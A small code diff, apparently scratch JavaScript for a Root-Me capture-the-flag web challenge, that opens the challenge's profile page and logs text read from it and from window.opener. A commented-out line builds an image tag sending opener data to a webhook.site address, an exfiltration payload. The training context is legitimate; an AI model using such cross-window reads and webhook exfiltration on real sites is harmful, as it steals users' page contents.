@@ -21,7 +21,8 @@
        //console.log("window.opener =", window.opener);
      // console.log("window.opener === null ?", window.opener === null);
       //console.log("document.referrer =", document.referrer);
-    console.log(window.opener);
+    let w = window.open("http://challenge01.root-me.org:58003/profile");
+    console.log(w.document.body.innerText);
     console.log(window.opener.document.body.innerText);
       //document.write('<IMG SRC=\"https://webhook.site/fbc71fa2-f69c-4896-93a7-e14745a28ee0?a=' + document.opener + '\">Hacked</IMG>');
      //setTimeout(() => {
